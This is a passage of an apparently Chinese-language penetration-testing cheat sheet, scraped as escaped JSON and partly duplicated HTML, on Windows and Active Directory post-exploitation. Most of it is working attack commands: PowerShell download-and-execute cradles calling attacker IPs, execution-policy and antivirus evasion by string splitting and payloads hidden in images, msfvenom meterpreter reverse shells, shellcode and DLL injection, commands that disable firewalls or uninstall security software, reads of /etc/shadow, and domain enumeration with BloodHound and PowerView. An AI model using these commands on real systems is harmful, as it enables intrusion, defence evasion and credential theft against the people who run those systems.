列出补丁列表\nwmic share get name,path 查看共享\nwmic startup list brief查看启动项\nwmic product get name,version 查看安装的软件\nwmic product where \&quot;name like &#39;%360%&#39;\&quot; get name 查看程序名\nwmic product where name=\&quot;360tray\&quot; call uninstall 卸载程序\nwmic process where \&quot;name like &#39;%360%&#39;\&quot; get name 查找进程全名\nwmic product where name=\&quot;360tray.exe\&quot; call terminate 停止程序\nwmic desktop get screensaversecure,screensavertimeout 查看屏保\n```\n# Powershell基础操作\n\n```\n查看版本$PSVersionTable\n```\n\n**远程执行**\n\n```\npowershell -nop -w hidden -ep bypass \&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;);Invoke-xxx\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/100.png)\n\n**加载exe**\n\n```\nmsfvenom生成exe木马\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe  /var/www/html/1.exe  \n使用powersploit的Invoke-ReflectivePEInjection.ps1脚本\npowershell.exe -w hidden -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR\&quot; \n```\n\n**EXE2PS1**\n\n```\nhttp://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1\n将exe转换为base64\nImport-Module .\\Convert-BinaryToString.ps1\nConvert-BinaryToString -FilePath .\\ms15051.exe\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/101.png)\n\n```\nhttp://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1\nInvoke-ReflectivePEInjection.ps1文件头部添加\nFunction MS15051{\n&lt;#\n.SYNOPSIS    \n.EXAMPLE\nC:\\PS MS15051 -Command \&quot;whoami\&quot;\n#\n [CmdletBinding()]\n    param(\n        [Parameter(Mandatory = $False)]\n        [string]\n        $Command\n  )\n$InputString = \&quot;文件的base64编码\&quot;\n$PEBytes = [System.Convert]::FromBase64String($InputString)\n文件尾部添加\nwrite-host (\&quot;[+] Executing Command: \&quot;+$Command)  -foregroundcolor \&quot;Green\&quot;\nInvoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command \nwrite-host (\&quot;[+] Done !\&quot;)  -foregroundcolor \&quot;Green\&quot;\n}\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/102.png)\n\n```\n远程下载执行\npowershell -nop -w hidden -ep bypass \&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1&#39;); MS15051 –Command \\\&quot;whoami\\\&quot;\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/103.png)\n\n**绕过策略**\n\n```\npowershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行\npowershell.exe -nop -exec bypass -c \&quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-xxx.ps1&#39;);invoke-xxx\&quot;\npowershell -exec bypass -File ./a.ps1&amp;Import-Module xxx\n```\n\n**Base64**\n\n```\nuse exploit/multi/script/web_delivery|target=2(PSH)\n&amp;\ncat payload.txt | iconv --to-code UTF-16LE |base64\npowershell -ep bypass -enc base64code\n```\n\n**写入bat绕过**\n\n```\npowershell -exec bypass -File ./a.ps1 \n将该命令保存为c.bat\n```\n\n**拼接拆分字符串**\n\n```\npowershell.exe  \n\&quot;\n$c1=&#39;powershell -c IEX&#39;; \n$c2=&#39;(New-Object Net.WebClient).Downlo&#39;; \n$c3=&#39;adString(\&quot;http://192.168.197.192/a.ps1\&quot;)&#39;; \necho ($c1,$c2,$c3) \n\&quot; \n先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。\npowershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)\n```\n\n**Replace替换函数**\n\n```\npowershell -noexit \&quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)\&quot; \n```\n\n**HTTP字符拼接绕过**\n\n```\n也可以对http字符进行绕过，同样可以bypass\npowershell \&quot;$a=&#39;IEX((new-object net.webclient).downloadstring(\&quot;ht&#39;;$b=&#39;tp://192.168.197.192/a.ps1\&quot;))&#39;;IEX ($a+$b)\&quot;  \n```\n\n**图片免杀**\n\n```\n通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。\nhttps://github.com/peewpw/Invoke-PSImage\n1900*1200的图片x.jpg。\nC:\\powershell \nPS C:\\ Import-Module .\\Invoke-PSImage.ps1 \nPS C:\\ Invoke-PSImage -Script .\\a.ps1 -Image .\\x.jpg -Out .\\reverse_shell.png -Web \na.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。\n将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。\n```\n\n**加载shellcode**\n\n```\nmsfvenom生成脚本木马\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  \n在windows靶机上运行一下命令\nPS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1\&quot;) \nPS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://192.168.72.164/test\&quot;) \nInvoke-Shellcode -Shellcode $buf -Force  运行木马 \n使用Invoke-Shellcode.ps1脚本执行shellcode\n即可反弹meterpreter shell\n```\n\n**加载dll**\n\n```\n使用msfvenom 生成dll木马脚本\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll \n将生成的dll上传到目标的C盘。在靶机上执行以下命令\nPS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1\&quot;) \nStart-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden  \n创建新的进程启动记事本，并设置为隐藏\nInvoke-DllInjection -ProcessID xxx -Dll c:\\test.dll 使用notepad的PID  \nMsf\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nrun\n```\n# Powerview\n\n```\n获取当前域信息\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; Get-NetDomain}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/302.png)\n\n```\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; get-netforest}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/303.png)\n\n```\n枚举管理员\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; Invoke-EnumerateLocalAdmin}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/304.png)\n\n```\n查询管理在线的机器\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; invoke-userhunter}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/305.png)\n\n```\n查看域内机器以administrator权限运行的进程\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; invoke-processhunter }\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/306.png)\n\n```\n或指定参数userfile和computerfile查询某台机器某个用户的进程\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; invoke-processhunter -Userfile .\\user.txt -computerfile .\\host.txt}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/307.png)\n\n```\n查询域内机器共享\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; Invoke-sharefinder}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/308.png)\n\n```\n查询域内机器\nGet-NetComputer -Domain zone.com\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/309.png)\n\n```\nFind-LocalAdminAccess -verbose 查询域内本地用户能登录的机器\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/310.png)\n\n```\nDev-powerview\n获取域控机器和win版本\nGet-DomainController |select name,osversion|fl \n枚举其他域： Get-NetDomain -Domain &lt;DomainName\n获取域 SID： Get-DomainSID\n获取域策略：Get-DomainPolicy\n获取域控制器：\nGet-NetDomainController\nGet-NetDomainController -Domain &lt;DomainName\n枚举域用户：\nGet-NetUser\nGet-NetUser -SamAccountName &lt;user \nGet-NetUser | select cn\n检查上次修改密码\nGet-UserProperty -Properties pwdlastset\n枚举域计算机\nGet-NetComputer -FullData\nGet-DomainGroup\n枚举存活主机\nGet-NetComputer -Ping\n枚举组策略：Get-NetGPO\n显示某台机器的活动策略\nGet-NetGPO -ComputerName &lt;Name of the PC\n枚举 OU：\nGet-NetOU -FullData \nGet-NetGPO -GPOname &lt;The GUID of the GPO\n枚举域信任：\nGet-NetDomainTrust\nGet-NetDomainTrust -Domain &lt;DomainName\n查找当前域中当前用户具有本地管理员访问权限的所有计算机\nFind-LocalAdminAccess -Verbose\n在域的所有机器上查找本地管理员\nInvoke-EnumerateLocalAdmin -Verbose\n全部使用技巧\nhttps://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993\n```\n# Linux\n\n```\n操作系统&amp;内核版本&amp;环境变量\ncat /etc/issue\ncat /etc/*-release\ncat /etc/lsb-release\ncat /etc/redhat-release\ncat /proc/version\nuname -a\nuname -mrs\nrpm -q kernel\ndmesg | grep Linux\nls /boot | grep vmlinuz-\ncat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\nenv\nset\nRoot权限进程\nps aux | grep root\nps -ef | grep root\n计划任务\ncrontab -l\nls -alh /var/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root\nIP信息\n/sbin/ifconfig -a\ncat /etc/network/interfaces\ncat /etc/sysconfig/network\n连接信息\ngrep 80 /etc/services\nnetstat -antup\nnetstat -antpx\nnetstat -tulpn\nchkconfig --list\nchkconfig --list | grep 3:on\nlast\nw\n用户信息\nid\nwhomi\nw\nlast\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\nls -alh /var/mail/\ngrep -v -E \&quot;^#\&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;   # 列出超级用户\nawk -F: &#39;($3 == \&quot;0\&quot;) {print}&#39; /etc/passwd   #列出超级用户\ncat /etc/sudoers\nsudo –l\n操作记录\ncat ~/.bash_history\ncat ~/.nano_history\ncat ~/.atftp_history\ncat ~/.mysql_history\ncat ~/.php_history\n可写目录\nfind / -writable -type d 2/dev/null      # 可写目录\nfind / -perm -222 -type d 2/dev/null     # 可写目录 \nfind / -perm -o w -type d 2/dev/null     # 可写目录\nfind / -perm -o x -type d 2/dev/null     # 可执行目录\nfind / \\( -perm -o w -perm -o x \\) -type d 2/dev/null   # 可写可执行目录\n```\n# ADDomain\n\n```\n获取当前域： Get-ADDomain\n枚举其他域： Get-ADDomain -Identity &lt;Domain\n获取域 SID： Get-DomainSID\n获取域控制器：\nGet-ADDomainController\nGet-ADDomainController -Identity &lt;DomainName\n枚举域用户：\nGet-ADUser -Filter * -Identity &lt;user -Properties *\n枚举域计算机：\nGet-ADComputer -Filter * -Properties *\nGet-ADGroup -Filter * \n枚举域信任：\nGet-ADTrust -Filter *\nGet-ADTrust -Identity &lt;DomainName\n枚举域林信任：\nGet-ADForest\nGet-ADForest -Identity &lt;ForestName\n枚举本地 AppLocker 有效策略：\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n```\n# BloodHoundAD\n\n**AzureHound**\n\n```\n. .\\AzureHound.ps1\nInvoke-AzureHound\n```\n\n**BloodHound**\n\n```\n.\\SharpHound.exe -c all -d active.htb --searchforest\n搜集不包括GPOLocalGroup的信息\n.\\SharpHound.exe -c all,GPOLocalGroup\n只从DC手机信息\n.\\SharpHound.exe --CollectionMethod DCOnly\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName --LdapPassword &lt;Password --JSONFolder &lt;PathToFile\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName --LdapPassword &lt;Password --domaincontroller 10.10.10.100 -d active.htb\n.\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23\n或使用powershell\nhttps://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1\n/usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1\nInvoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public\nInvoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName -LDAPPass &lt;Password -OutputDirectory &lt;PathToFile\n或远程使用BloodHound Python\nhttps://github.com/fox-it/BloodHound.py\npip install bloodhound\nbloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all\n使用 Certipy 收集更多用于证书利用的数据\ncertipy find &#39;corp.local/john:Passw0rd@dc.corp.local&#39; -bloodhound\n然后将 zip/json 文件导入 Neo4J 数据库并进行查询。\napt install bloodhound \n启动BloodHound和数据库\nneo4j console\n或者使用docker\ndocker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j\n./bloodhound --no-sandbox\n访问http://127.0.0.1:7474  user:neo4J, pass:neo4j\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/内网和域/内网常用命令.md&quot;],&quot;digest&quot;:[0,&quot;136ee43f6e8d678c&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;windows安全标识符sid\&quot;&gt;Windows安全标识符SID&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#windows安全标识符sid\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;相对标识符&lt;/th&gt;&lt;th&gt;说明&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;500&lt;/td&gt;&lt;td&gt;管理员&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;501&lt;/td&gt;&lt;td&gt;来宾&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;502&lt;/td&gt;&lt;td&gt;密钥分发中心服务的服务账户&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;512&lt;/td&gt;&lt;td&gt;域管理员&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;513&lt;/td&gt;&lt;td&gt;域用户&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;514&lt;/td&gt;&lt;td&gt;域来宾&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;515&lt;/td&gt;&lt;td&gt;域计算机&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;516&lt;/td&gt;&lt;td&gt;域控制器&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;544&lt;/td&gt;&lt;td&gt;内置管理员&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;519&lt;/td&gt;&lt;td&gt;企业管理员&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n&lt;h1 id=\&quot;临时http服务架设\&quot;&gt;临时HTTP服务架设&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#临时http服务架设\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python2 -m SimpleHTTPServer &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python3 -m http.server 8080&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;php -S 0.0.0.0:8888&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl s_server -key key.pem -cert cert.pem -accept 443 –WWW&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ruby -rwebrick -e \&quot;WEBrick::HTTPServer.new(:Port = 8888,:DocumentRoot = Dir.pwd).start\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ruby -run -e httpd . -p 8888&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;cmd\&quot;&gt;Cmd&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#cmd\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami /user 查看当前用户SID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net config Workstation 查看当前计算机信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net time /domain 判断主域&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;错误5：存在域，当前不是域用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;显示时间：存在域，当前是域内用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;找不到域：不存在&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net view /domain 列出域列表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net group \&quot;Domain Controllers\&quot; /domain查看主域控&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nltest /DCLIST:zone.com 查看域控&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net group \&quot;domain admins\&quot; /domain 查看域管理员&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net group \&quot;enterprise admins\&quot; /domain 查看企业管理员列表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net localgroup administrators /domain 查看管理组用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net group \&quot;domain computers\&quot; /domain 查看域成员计算机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net accounts /domain 查看密码策略&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net user /domain查看域内用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net view /domain:dc 查询域内计算机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netsh firewall set opmode disable/enable 关闭windows防火墙(win2003)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netsh advfirewall set allprofiles state off/on(大于win2003)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;arp -a查看arp表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net start 查看服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;route print查看路由表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;query user查看登录机器的用户的连接状态&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;tasklist /v 查看域管理员进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dsquery server查询域控制器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dsquery computer 查询域内机器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dsquery user 查询域用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dsquery ou 域内组织单位&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;导出域DNS记录，文件保存在C:\\Windows\\System32\\dns\\&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dnscmd /zoneexport zone.com 1.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;导出LDAP数据库&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;LDIFDE -f c:\\windows\\temp\\dump.ldf -n -m&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;wmi\&quot;&gt;Wmi&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#wmi\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic service list brief 列出本机服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process list brief 列出进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where name=\&quot;chrome.exe\&quot; get executablepath进程路径&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process get caption,commandline /value1.txt查询所有进程参数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where caption=\&quot;svchost.exe\&quot; get caption,commandline /value 查询某个进程命令行参数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;创建进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create calc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create \&quot;C:\\shell.exe\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process call create \&quot;shutdown.exe -r -f -t 20\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;结束进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where name=\&quot;shell.exe\&quot; call terminate&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where processid=\&quot;2345\&quot; delete&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process 2345 call terminate&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic startup list brief 列出自启动程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic netuse list brief 列出共享驱动盘&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic ntdomain list brief 查询域控制器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic useraccount list brief 列出本机管理员及SID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic qfe list brief 列出补丁列表&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic share get name,path 查看共享&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic startup list brief查看启动项&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product get name,version 查看安装的软件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where \&quot;name like &#39;%360%&#39;\&quot; get name 查看程序名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where name=\&quot;360tray\&quot; call uninstall 卸载程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where \&quot;name like &#39;%360%&#39;\&quot; get name 查找进程全名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic product where name=\&quot;360tray.exe\&quot; call terminate 停止程序&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic desktop get screensaversecure,screensavertimeout 查看屏保&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;wmi-1\&quot;&gt;Wmi&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#wmi-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic service list brief 列出本机服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process list brief 列出进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where name=\&quot;chrome.exe\&quot; get executablepath进程路径&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process get caption,commandline /value1.txt查询所有进程参数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wmic process where caption=\&quot;svchost.exe\&quot; get caption,commandline /value 查询某个进程命令行参数&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;创建进程&lt;/span&gt;&lt;/span&gt;\n&lt;span 